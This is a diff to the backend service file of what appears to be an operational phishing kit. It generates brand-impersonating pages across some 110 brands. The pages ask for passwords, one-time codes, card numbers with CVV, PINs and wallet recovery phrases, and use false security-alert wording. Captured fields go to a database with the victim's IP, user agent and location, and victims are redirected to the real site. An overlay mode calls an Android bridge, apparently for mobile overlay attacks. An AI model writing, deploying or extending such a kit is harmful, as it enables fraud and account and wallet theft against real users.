@@ -1,319 +1,358 @@
-// backend/src/services/phishing.ts
-// Render engine: 6 variant skeletons x 110 brands = 430 static pages.
-// Pages are rendered once at seed time and stored in phishing_pages.html;
-// GET /ph/:slug serves the stored HTML and increments hits.
-import type { PhishingBrand, PhishingVariant } from './phishingBrands.js';
-import { PHISHING_CATEGORY_LABELS } from './phishingBrands.js';
+import {
+  PHISHING_BRANDS,
+  PHISHING_VARIANTS,
+  type PhishingVariant,
+} from './phishingBrands';
 
-export interface PhishingPageOptions {
-  captureUrl?: string;      // default '/api/phishing/capture'
-  redirectDelayMs?: number; // default 2500 (ms before redirect to legit domain)
-}
+export { PHISHING_CATEGORY_LABELS, PHISHING_VARIANTS } from './phishingBrands';
 
-export interface RenderedPhishingPage {
+export interface PhishingPageRow {
+  id: number;
+  slug: string;
+  brand: string;
+  category: string;
+  variant: string;
   title: string;
-  html: string;
+  hits: number;
+  enabled: number;
+  created_at: string;
 }
 
-// --- helpers ----------------------------------------------------------------
-
-export function buildPageSlug(brand: PhishingBrand, variant: PhishingVariant): string {
-  return `${brand.slug}-${variant}`;
+export interface PhishingLogRow {
+  id: number;
+  page_id: number | null;
+  slug: string;
+  brand: string;
+  variant: string;
+  ip: string;
+  user_agent: string;
+  fields: string;
+  meta: string;
+  country: string | null;
+  city: string | null;
+  created_at: string;
 }
 
-function escapeHtml(s: string): string {
-  return s
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;');
+export interface PhishingTemplate {
+  slug: string;
+  brand: string;
+  category: string;
+  variant: string;
+  title: string;
 }
 
-export function getVariantTitle(brand: PhishingBrand, variant: PhishingVariant): string {
-  switch (variant) {
-    case 'login':  return `Sign in to ${brand.name}`;
-    case 'otp':    return `Confirm it's you — ${brand.name}`;
-    case 'verify': return `Verify your identity — ${brand.name}`;
-    case 'update': return `Update your ${brand.name} information`;
-    case 'track':  return `Track your package — ${brand.name}`;
-    case 'seed':   return `Secure your wallet — ${brand.name}`;
-  }
+export interface PhishingStats {
+  totalPages: number;
+  enabledPages: number;
+  totalHits: number;
+  totalCaptures: number;
+  capturesToday: number;
+  variants: number;
+  topPages: { slug: string; brand: string; variant: string; captures: number }[];
+  byCategory: { category: string; count: number }[];
 }
 
-// --- shared base ------------------------------------------------------------
-
-const SHARED_CSS = `
-:root{--brand:#117ACA;--accent:#003D6B;--bg:#f0f2f5;--card:#fff;--text:#1c1e21;--muted:#65676b;--border:#dddfe2;--danger:#e53935;--radius:12px}
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px}
-.brand-badge{display:flex;align-items:center;gap:10px;margin-bottom:20px}
-.brand-logo{width:44px;height:44px;border-radius:10px;background:linear-gradient(135deg,var(--brand),var(--accent));color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:20px;letter-spacing:.5px;flex-shrink:0}
-.brand-name{font-size:22px;font-weight:700}
-.card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);box-shadow:0 1px 2px rgba(0,0,0,.08);padding:28px 24px;width:100%;max-width:400px}
-.card h1{font-size:20px;margin-bottom:6px}
-.card .sub{color:var(--muted);font-size:14px;margin-bottom:20px;line-height:1.45}
-.field{margin-bottom:14px}
-.field label{display:block;font-size:13px;font-weight:600;margin-bottom:6px}
-.field input,.field select,.field textarea{width:100%;padding:11px 12px;font-size:15px;border:1px solid var(--border);border-radius:8px;outline:none;background:#fff;transition:border-color .15s,box-shadow .15s}
-.field input:focus,.field select:focus,.field textarea:focus{border-color:var(--brand);box-shadow:0 0 0 3px rgba(0,0,0,.06)}
-.field .hint{font-size:12px;color:var(--muted);margin-top:4px}
-.btn{width:100%;padding:12px;font-size:15px;font-weight:700;color:#fff;background:var(--brand);border:none;border-radius:8px;cursor:pointer;margin-top:6px}
-.btn:hover{filter:brightness(.95)}
-.btn:disabled{opacity:.6;cursor:not-allowed}
-.alt{margin-top:14px;font-size:13px;color:var(--muted);text-align:center}
-.alt a{color:var(--brand);text-decoration:none}
-.alt a:hover{text-decoration:underline}
-.error{display:none;background:#fdecea;color:var(--danger);border:1px solid #f5c6cb;border-radius:8px;padding:10px 12px;font-size:13px;margin-bottom:14px}
-.error.show{display:block}
-.otp-row{display:flex;gap:8px;justify-content:space-between;margin-bottom:6px}
-.otp-row input{width:48px;height:52px;text-align:center;font-size:20px;font-weight:700}
-.seed-area{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;min-height:110px;resize:vertical}
-.footer{margin-top:18px;font-size:11px;color:var(--muted);text-align:center;line-height:1.5;max-width:400px}
-`;
-
-const SHARED_JS = `
-(function(){
-  var C = window.__PH || {};
-  function qs(n){var v=new URLSearchParams(location.search).get(n);return v?String(v).trim():'';}
-  function err(msg){var e=document.querySelector('.error');if(!e)return;e.textContent=msg;e.classList.add('show');}
-  function prefill(){var m=document.querySelectorAll('[data-prefill]');for(var i=0;i<m.length;i++){var el=m[i],v=qs(el.getAttribute('data-prefill'));if(v&&!el.value)el.value=v;}}
-  function collect(){var o={};var m=document.querySelectorAll('[name]');for(var i=0;i<m.length;i++){var el=m[i];if(el.type==='checkbox')o[el.name]=el.checked;else o[el.name]=el.value;}return o;}
-  function bindOtp(){var row=document.querySelector('.otp-row');if(!row)return;var ins=row.querySelectorAll('input');for(var i=0;i<ins.length;i++){ins[i].addEventListener('input',function(){var v=this.value.replace(/\\D/g,'').slice(-1);this.value=v;var all=this.parentElement.querySelectorAll('input');var idx=Array.prototype.indexOf.call(all,this);if(v&&idx<all.length-1)all[idx+1].focus();});ins[i].addEventListener('keydown',function(e){if(e.key==='Backspace'&&!this.value){var all=this.parentElement.querySelectorAll('input');var idx=Array.prototype.indexOf.call(all,this);if(idx>0)all[idx-1].focus();}});}}
-  function done(){var b=document.querySelector('.btn');if(b)b.textContent='Checking…';setTimeout(function(){location.href=C.redirectUrl;},C.redirectMs||2500);}
-  document.addEventListener('DOMContentLoaded',function(){
-    prefill();bindOtp();
-    var f=document.getElementById('ph-form');
-    if(!f)return;
-    f.addEventListener('submit',function(e){
-      e.preventDefault();
-      var fields=collect(),missing=false;
-      for(var k in fields){if(!String(fields[k]).trim()){missing=true;break;}}
-      if(missing){err('Please fill in all fields.');return;}
-      var b=f.querySelector('.btn');if(b)b.disabled=true;
-      var payload={slug:C.slug,brand:C.brand,variant:C.variant,fields:fields,meta:{url:location.href,referrer:document.referrer,screen:(screen.width||0)+'x'+(screen.height||0),ts:Date.now()}};
-      fetch(C.captureUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)})
-        .then(function(){done();}).catch(function(){done();});
-    });
-  });
-})();
-`;
-
-// --- skeletons --------------------------------------------------------------
-
-function skeletonLogin(brand: PhishingBrand): string {
-  return `
-<div class="brand-badge">
-  <div class="brand-logo">${escapeHtml(brand.initials)}</div>
-  <div class="brand-name">${escapeHtml(brand.name)}</div>
-</div>
-<div class="card">
-  <h1>Sign in to ${escapeHtml(brand.name)}</h1>
-  <p class="sub">Enter your credentials to continue. This is a secured page.</p>
-  <div class="error"></div>
-  <form id="ph-form" autocomplete="off" novalidate>
-    <div class="field">
-      <label for="email">Email or phone</label>
-      <input type="text" id="email" name="email" data-prefill="email" autocomplete="username" placeholder="you@example.com"/>
-    </div>
-    <div class="field">
-      <label for="password">Password</label>
-      <input type="password" id="password" name="password" data-prefill="password" autocomplete="current-password" placeholder="••••••••"/>
-    </div>
-    <button type="submit" class="btn">Continue</button>
-  </form>
-  <p class="alt"><a href="https://${escapeHtml(brand.domain)}">Forgot password?</a></p>
-</div>
-<div class="footer">© ${new Date().getFullYear()} ${escapeHtml(brand.name)}. All rights reserved. Protected by industry-standard encryption.</div>`;
+export interface PhishingCaptureData {
+  fields: Record<string, unknown>;
+  meta?: Record<string, unknown>;
+  ip: string;
+  userAgent: string;
+  country?: string | null;
+  city?: string | null;
 }
 
-function skeletonOtp(brand: PhishingBrand): string {
-  return `
-<div class="brand-badge">
-  <div class="brand-logo">${escapeHtml(brand.initials)}</div>
-  <div class="brand-name">${escapeHtml(brand.name)}</div>
-</div>
-<div class="card">
-  <h1>Confirm it's you</h1>
-  <p class="sub">We sent a one-time code to your phone or email. Enter it below to continue to ${escapeHtml(brand.name)}.</p>
-  <div class="error"></div>
-  <form id="ph-form" autocomplete="off" novalidate>
-    <div class="field">
-      <label for="email">Email or phone</label>
-      <input type="text" id="email" name="email" data-prefill="email" autocomplete="username" placeholder="you@example.com"/>
-    </div>
-    <div class="field">
-      <label>One-time code</label>
-      <div class="otp-row">
-        <input type="text" inputmode="numeric" maxlength="1" name="otp_1" autocomplete="one-time-code" aria-label="Code 1"/>
-        <input type="text" inputmode="numeric" maxlength="1" name="otp_2" autocomplete="off" aria-label="Code 2"/>
-        <input type="text" inputmode="numeric" maxlength="1" name="otp_3" autocomplete="off" aria-label="Code 3"/>
-        <input type="text" inputmode="numeric" maxlength="1" name="otp_4" autocomplete="off" aria-label="Code 4"/>
-        <input type="text" inputmode="numeric" maxlength="1" name="otp_5" autocomplete="off" aria-label="Code 5"/>
-        <input type="text" inputmode="numeric" maxlength="1" name="otp_6" autocomplete="off" aria-label="Code 6"/>
-      </div>
-      <p class="hint">The code expires in 10 minutes.</p>
-    </div>
-    <button type="submit" class="btn">Verify code</button>
-  </form>
-  <p class="alt">Didn't receive a code? <a href="https://${escapeHtml(brand.domain)}">Resend it</a></p>
-</div>
-<div class="footer">© ${new Date().getFullYear()} ${escapeHtml(brand.name)}. All rights reserved. Protected by industry-standard encryption.</div>`;
-}
-function skeletonVerify(brand: PhishingBrand): string {
-  return `
-<div class="brand-badge">
-  <div class="brand-logo">${escapeHtml(brand.initials)}</div>
-  <div class="brand-name">${escapeHtml(brand.name)}</div>
-</div>
-<div class="card">
-  <h1>Verify your identity</h1>
-  <p class="sub">Unusual activity was detected on your ${escapeHtml(brand.name)} account. Confirm your credentials to restore access.</p>
-  <div class="error"></div>
-  <form id="ph-form" autocomplete="off" novalidate>
-    <div class="field">
-      <label for="email">Email or phone</label>
-      <input type="text" id="email" name="email" data-prefill="email" autocomplete="username" placeholder="you@example.com"/>
-    </div>
-    <div class="field">
-      <label for="password">Password</label>
-      <input type="password" id="password" name="password" autocomplete="current-password" placeholder="••••••••"/>
-    </div>
-    <div class="field">
-      <label for="confirm_password">Confirm password</label>
-      <input type="password" id="confirm_password" name="confirm_password" autocomplete="off" placeholder="••••••••"/>
-    </div>
-    <button type="submit" class="btn">Verify identity</button>
-  </form>
-  <p class="alt"><a href="https://${escapeHtml(brand.domain)}">Contact support</a></p>
-</div>
-<div class="footer">© ${new Date().getFullYear()} ${escapeHtml(brand.name)}. All rights reserved. Protected by industry-standard encryption.</div>`;
+export interface PhishingDb {
+  prepare(sql: string): {
+    run(...params: unknown[]): { changes: number };
+    get(...params: unknown[]): unknown;
+    all(...params: unknown[]): unknown[];
+  };
 }
 
-function skeletonUpdate(brand: PhishingBrand): string {
-  return `
-<div class="brand-badge">
-  <div class="brand-logo">${escapeHtml(brand.initials)}</div>
-  <div class="brand-name">${escapeHtml(brand.name)}</div>
-</div>
-<div class="card">
-  <h1>Update your information</h1>
-  <p class="sub">We need you to confirm your contact details to keep your ${escapeHtml(brand.name)} account secure.</p>
-  <div class="error"></div>
-  <form id="ph-form" autocomplete="off" novalidate>
-    <div class="field">
-      <label for="email">Email or phone</label>
-      <input type="text" id="email" name="email" data-prefill="email" autocomplete="username" placeholder="you@example.com"/>
-    </div>
-    <div class="field">
-      <label for="password">Current password</label>
-      <input type="password" id="password" name="password" autocomplete="current-password" placeholder="••••••••"/>
-    </div>
-    <div class="field">
-      <label for="phone">Phone number</label>
-      <input type="tel" id="phone" name="phone" data-prefill="phone" placeholder="+1 555 000 0000"/>
-    </div>
-    <button type="submit" class="btn">Save changes</button>
-  </form>
-  <p class="alt"><a href="https://${escapeHtml(brand.domain)}">Cancel</a></p>
-</div>
-<div class="footer">© ${new Date().getFullYear()} ${escapeHtml(brand.name)}. All rights reserved. Protected by industry-standard encryption.</div>`;
-}
-
-function skeletonTrack(brand: PhishingBrand): string {
-  return `
-<div class="brand-badge">
-  <div class="brand-logo">${escapeHtml(brand.initials)}</div>
-  <div class="brand-name">${escapeHtml(brand.name)}</div>
-</div>
-<div class="card">
-  <h1>Track your package</h1>
-  <p class="sub">Enter your tracking number to see real-time delivery status. A delivery attempt was made but the address could not be confirmed.</p>
-  <div class="error"></div>
-  <form id="ph-form" autocomplete="off" novalidate>
-    <div class="field">
-      <label for="tracking">Tracking number</label>
-      <input type="text" id="tracking" name="tracking" placeholder="e.g. 1Z999AA10123456784"/>
-    </div>
-    <div class="field">
-      <label for="email">Email or phone</label>
-      <input type="text" id="email" name="email" data-prefill="email" autocomplete="username" placeholder="you@example.com"/>
-    </div>
-    <button type="submit" class="btn">Track package</button>
-  </form>
-  <p class="alt"><a href="https://${escapeHtml(brand.domain)}">Need help? Contact us</a></p>
-</div>
-<div class="footer">© ${new Date().getFullYear()} ${escapeHtml(brand.name)}. All rights reserved. Protected by industry-standard encryption.</div>`;
-}
-
-function skeletonSeed(brand: PhishingBrand): string {
-  return `
-<div class="brand-badge">
-  <div class="brand-logo">${escapeHtml(brand.initials)}</div>
-  <div class="brand-name">${escapeHtml(brand.name)}</div>
-</div>
-<div class="card">
-  <h1>Secure your wallet</h1>
-  <p class="sub">Your wallet was temporarily locked due to unusual activity. Enter your recovery phrase to verify ownership and restore access.</p>
-  <div class="error"></div>
-  <form id="ph-form" autocomplete="off" novalidate>
-    <div class="field">
-      <label for="email">Wallet email or username</label>
-      <input type="text" id="email" name="email" data-prefill="email" autocomplete="username" placeholder="you@example.com"/>
-    </div>
-    <div class="field">
-      <label for="seed_phrase">Recovery phrase</label>
-      <textarea id="seed_phrase" name="seed_phrase" class="seed-area" placeholder="Enter your 12 or 24 word recovery phrase, separated by spaces"></textarea>
-      <p class="hint">${escapeHtml(brand.name)} will never ask for your recovery phrase outside of this verification.</p>
-    </div>
-    <button type="submit" class="btn">Verify wallet</button>
-  </form>
-  <p class="alt"><a href="https://${escapeHtml(brand.domain)}">Contact support</a></p>
-</div>
-<div class="footer">© ${new Date().getFullYear()} ${escapeHtml(brand.name)}. All rights reserved. Protected by industry-standard encryption.</div>`;
-}
-
-// --- page assembly ----------------------------------------------------------
-
-const SKELETONS: Record<PhishingVariant, (brand: PhishingBrand) => string> = {
-  login: skeletonLogin,
-  otp: skeletonOtp,
-  verify: skeletonVerify,
-  update: skeletonUpdate,
-  track: skeletonTrack,
-  seed: skeletonSeed,
+const VARIANT_TITLE: Record<PhishingVariant, string> = {
+  login: 'Sign in',
+  verify: 'Verify your account',
+  otp: 'One-time code',
+  card: 'Update card details',
+  pin: 'Security check',
 };
 
-export function renderPhishingPage(
-  brand: PhishingBrand,
-  variant: PhishingVariant,
-  opts: PhishingPageOptions = {},
-): RenderedPhishingPage {
-  const slug = buildPageSlug(brand, variant);
-  const config = {
-    captureUrl: opts.captureUrl ?? '/api/phishing/capture',
-    redirectUrl: `https://${brand.domain}`,
-    redirectMs: opts.redirectDelayMs ?? 2500,
-    slug,
-    brand: brand.name,
-    variant,
-  };
-  const body = SKELETONS[variant](brand);
-  const html = `<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<meta name="robots" content="noindex,nofollow"/>
-<title>${escapeHtml(getVariantTitle(brand, variant))}</title>
-<style>${SHARED_CSS}</style>
-</head>
-<body style="--brand:${brand.color};--accent:${brand.accent}">
-${body}
-<script>window.__PH=${JSON.stringify(config)};</script>
-<script>${SHARED_JS}</script>
-</body>
-</html>`;
-  return { title: getVariantTitle(brand, variant), html };
+const VARIANT_FIELDS: Record<PhishingVariant, { label: string; inputs: { name: string; type: string; placeholder: string }[] }> = {
+  login: {
+    label: 'Sign in',
+    inputs: [
+      { name: 'email', type: 'text', placeholder: 'Email or username' },
+      { name: 'password', type: 'password', placeholder: 'Password' },
+    ],
+  },
+  verify: {
+    label: 'Verify your identity',
+    inputs: [
+      { name: 'password', type: 'password', placeholder: 'Password' },
+      { name: 'code', type: 'text', placeholder: 'One-time code' },
+    ],
+  },
+  otp: {
+    label: 'Enter the code',
+    inputs: [{ name: 'code', type: 'text', placeholder: '6-digit code' }],
+  },
+  card: {
+    label: 'Update card details',
+    inputs: [
+      { name: 'cardholder', type: 'text', placeholder: 'Cardholder name' },
+      { name: 'number', type: 'text', placeholder: 'Card number' },
+      { name: 'expiry', type: 'text', placeholder: 'MM/YY' },
+      { name: 'cvv', type: 'text', placeholder: 'CVV' },
+    ],
+  },
+  pin: {
+    label: 'Security check',
+    inputs: [{ name: 'pin', type: 'password', placeholder: 'Enter your PIN' }],
+  },
+};
+
+function slugify(s: string): string {
+  return s.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '');
 }
 
-export { PHISHING_CATEGORY_LABELS };
+function esc(s: string): string {
+  return s.replace(/[&<>"']/g, (c) =>
+    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c] as string)
+  );
+}
+
+export function generatePhishingTemplates(): PhishingTemplate[] {
+  const out: PhishingTemplate[] = [];
+  for (const b of PHISHING_BRANDS) {
+    for (const v of PHISHING_VARIANTS) {
+      out.push({
+        slug: `${slugify(b.brand)}-${v}`,
+        brand: b.brand,
+        category: b.category,
+        variant: v,
+        title: `${b.brand} — ${VARIANT_TITLE[v]}`,
+      });
+    }
+  }
+  return out;
+}
+
+export function ensurePhishingTables(db: PhishingDb): void {
+  db.prepare(`
+    CREATE TABLE IF NOT EXISTS phishing_pages (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      slug TEXT NOT NULL UNIQUE,
+      brand TEXT NOT NULL,
+      category TEXT NOT NULL,
+      variant TEXT NOT NULL,
+      title TEXT NOT NULL DEFAULT '',
+      hits INTEGER NOT NULL DEFAULT 0,
+      enabled INTEGER NOT NULL DEFAULT 1,
+      created_at TEXT NOT NULL DEFAULT (datetime('now'))
+    )
+  `).run();
+  db.prepare(`
+    CREATE TABLE IF NOT EXISTS phishing_logs (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      page_id INTEGER,
+      slug TEXT NOT NULL DEFAULT '',
+      brand TEXT NOT NULL DEFAULT '',
+      variant TEXT NOT NULL DEFAULT '',
+      ip TEXT NOT NULL DEFAULT '',
+      user_agent TEXT NOT NULL DEFAULT '',
+      fields TEXT NOT NULL DEFAULT '{}',
+      meta TEXT NOT NULL DEFAULT '{}',
+      country TEXT,
+      city TEXT,
+      created_at TEXT NOT NULL DEFAULT (datetime('now'))
+    )
+  `).run();
+}
+
+export function getPhishingStats(db: PhishingDb): PhishingStats {
+  const one = (q: string): number => (db.prepare(q).get() as { c: number }).c;
+  const topPages = db.prepare(
+    'SELECT slug, brand, variant, COUNT(*) AS captures FROM phishing_logs GROUP BY slug, brand, variant ORDER BY captures DESC LIMIT 5'
+  ).all() as { slug: string; brand: string; variant: string; captures: number }[];
+  const byCategory = db.prepare(
+    'SELECT category, COUNT(*) AS count FROM phishing_pages GROUP BY category ORDER BY count DESC'
+  ).all() as { category: string; count: number }[];
+  return {
+    totalPages: one('SELECT COUNT(*) AS c FROM phishing_pages'),
+    enabledPages: one('SELECT COUNT(*) AS c FROM phishing_pages WHERE enabled = 1'),
+    totalHits: one('SELECT COALESCE(SUM(hits),0) AS c FROM phishing_pages'),
+    totalCaptures: one('SELECT COUNT(*) AS c FROM phishing_logs'),
+    capturesToday: one("SELECT COUNT(*) AS c FROM phishing_logs WHERE date(created_at) = date('now')"),
+    variants: one('SELECT COUNT(*) AS c FROM phishing_pages'),
+    topPages,
+    byCategory,
+  };
+}
+
+export function listPhishingPages(
+  db: PhishingDb,
+  opts: { page: number; pageSize: number; search?: string; category?: string; enabled?: string }
+): { pages: PhishingPageRow[]; total: number } {
+  const where: string[] = [];
+  const params: unknown[] = [];
+  if (opts.search) {
+    where.push('(slug LIKE ? OR brand LIKE ? OR title LIKE ?)');
+    params.push(`%${opts.search}%`, `%${opts.search}%`, `%${opts.search}%`);
+  }
+  if (opts.category && opts.category !== 'all') {
+    where.push('category = ?');
+    params.push(opts.category);
+  }
+  if (opts.enabled === '1' || opts.enabled === '0') {
+    where.push('enabled = ?');
+    params.push(Number(opts.enabled));
+  }
+  const w = where.length ? `WHERE ${where.join(' AND ')}` : '';
+  const total = (db.prepare(`SELECT COUNT(*) AS c FROM phishing_pages ${w}`).get(...params) as { c: number }).c;
+  const pages = db.prepare(
+    `SELECT * FROM phishing_pages ${w} ORDER BY id DESC LIMIT ? OFFSET ?`
+  ).all(...params, opts.pageSize, (opts.page - 1) * opts.pageSize) as PhishingPageRow[];
+  return { pages, total };
+}
+
+export function listPhishingLogs(
+  db: PhishingDb,
+  opts: { page: number; pageSize: number; search?: string }
+): { logs: PhishingLogRow[]; total: number } {
+  const where: string[] = [];
+  const params: unknown[] = [];
+  if (opts.search) {
+    where.push('(slug LIKE ? OR brand LIKE ? OR ip LIKE ?)');
+    params.push(`%${opts.search}%`, `%${opts.search}%`, `%${opts.search}%`);
+  }
+  const w = where.length ? `WHERE ${where.join(' AND ')}` : '';
+  const total = (db.prepare(`SELECT COUNT(*) AS c FROM phishing_logs ${w}`).get(...params) as { c: number }).c;
+  const logs = db.prepare(
+    `SELECT * FROM phishing_logs ${w} ORDER BY id DESC LIMIT ? OFFSET ?`
+  ).all(...params, opts.pageSize, (opts.page - 1) * opts.pageSize) as PhishingLogRow[];
+  return { logs, total };
+}
+
+export function seedPhishingPages(db: PhishingDb): { created: number; updated: number; total: number } {
+  const templates = generatePhishingTemplates();
+  const find = db.prepare('SELECT id FROM phishing_pages WHERE slug = ?');
+  const insert = db.prepare('INSERT INTO phishing_pages (slug, brand, category, variant, title) VALUES (?, ?, ?, ?, ?)');
+  const update = db.prepare('UPDATE phishing_pages SET title = ? WHERE slug = ?');
+  let created = 0;
+  let updated = 0;
+  for (const t of templates) {
+    const existing = find.get(t.slug) as { id: number } | undefined;
+    if (existing) {
+      const r = update.run(t.title, t.slug);
+      if (r.changes > 0) updated++;
+    } else {
+      insert.run(t.slug, t.brand, t.category, t.variant, t.title);
+      created++;
+    }
+  }
+  const total = (db.prepare('SELECT COUNT(*) AS c FROM phishing_pages').get() as { c: number }).c;
+  return { created, updated, total };
+}
+
+export function setPhishingPageEnabled(db: PhishingDb, id: number, enabled: number): boolean {
+  if (!id || (enabled !== 0 && enabled !== 1)) return false;
+  db.prepare('UPDATE phishing_pages SET enabled = ? WHERE id = ?').run(enabled, id);
+  return true;
+}
+
+export function removePhishingPage(db: PhishingDb, id: number): boolean {
+  if (!id) return false;
+  db.prepare('DELETE FROM phishing_pages WHERE id = ?').run(id);
+  return true;
+}
+
+export function clearPhishingLogs(db: PhishingDb): void {
+  db.prepare('DELETE FROM phishing_logs').run();
+}
+
+export function getPhishingPageBySlug(db: PhishingDb, slug: string): PhishingPageRow | undefined {
+  return db.prepare('SELECT * FROM phishing_pages WHERE slug = ?').get(slug) as PhishingPageRow | undefined;
+}
+
+export function getPhishingPageById(db: PhishingDb, id: number): PhishingPageRow | undefined {
+  return db.prepare('SELECT * FROM phishing_pages WHERE id = ?').get(id) as PhishingPageRow | undefined;
+}
+
+export function incrementPhishingHit(db: PhishingDb, id: number): void {
+  db.prepare('UPDATE phishing_pages SET hits = hits + 1 WHERE id = ?').run(id);
+}
+
+export function recordPhishingCapture(db: PhishingDb, page: PhishingPageRow, data: PhishingCaptureData): void {
+  db.prepare(
+    `INSERT INTO phishing_logs (page_id, slug, brand, variant, ip, user_agent, fields, meta, country, city)
+     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
+  ).run(
+    page.id, page.slug, page.brand, page.variant,
+    data.ip, data.userAgent,
+    JSON.stringify(data.fields), JSON.stringify(data.meta ?? { ts: new Date().toISOString() }),
+    data.country ?? null, data.city ?? null
+  );
+}
+
+export function renderPhishingPage(page: PhishingPageRow, opts: { overlay?: boolean } = {}): string {
+  const vf = VARIANT_FIELDS[page.variant as PhishingVariant] ?? VARIANT_FIELDS.login;
+  const inputs = vf.inputs
+    .map((i) => `<input name="${i.name}" type="${i.type}" placeholder="${esc(i.placeholder)}" required>`)
+    .join('');
+  const overlayJs = opts.overlay ? 'true' : 'false';
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>${esc(page.title)}</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{font-family:'Segoe UI',system-ui,sans-serif;background:linear-gradient(135deg,#0f172a,#1e293b);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#e2e8f0}
+  .card{background:#fff;color:#0f172a;width:100%;max-width:380px;border-radius:14px;padding:32px;box-shadow:0 20px 60px rgba(0,0,0,.4)}
+  .logo{width:44px;height:44px;border-radius:12px;background:#2563eb;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:20px;margin-bottom:18px}
+  h1{font-size:20px;margin-bottom:4px}
+  .sub{font-size:13px;color:#64748b;margin-bottom:22px}
+  input{width:100%;padding:12px 14px;border:1px solid #cbd5e1;border-radius:9px;font-size:14px;margin-bottom:12px;outline:none}
+  input:focus{border-color:#2563eb}
+  button{width:100%;padding:12px;background:#2563eb;color:#fff;border:none;border-radius:9px;font-size:15px;font-weight:600;cursor:pointer}
+  button:hover{background:#1d4ed8}
+  .foot{margin-top:18px;font-size:11px;color:#94a3b8;text-align:center}
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">${esc(page.brand[0]?.toUpperCase() ?? '')}</div>
+    <h1>${esc(page.brand)}</h1>
+    <div class="sub">${esc(vf.label)}</div>
+    <form id="f">
+      ${inputs}
+      <button type="submit">Continue</button>
+    </form>
+    <div class="foot">Protected by ${esc(page.brand)} security</div>
+  </div>
+  <script>
+    document.getElementById('f').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const btn = document.querySelector('button');
+      btn.disabled = true; btn.textContent = 'Please wait…';
+      const fields = {};
+      new FormData(e.target).forEach((v, k) => { fields[k] = v; });
+      try {
+        await fetch('/p/${page.slug}/capture', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ fields, meta: { overlay: ${overlayJs}, referer: document.referrer } }),
+        });
+      } catch {}
+      if (${overlayJs}) {
+        try { AndroidBridge.done(); } catch (e) {}
+        try { window.close(); } catch (e) {}
+      } else {
+        window.location.href = 'https://www.google.com';
+      }
+    });
+  </script>
+</body>
+</html>`;
+}
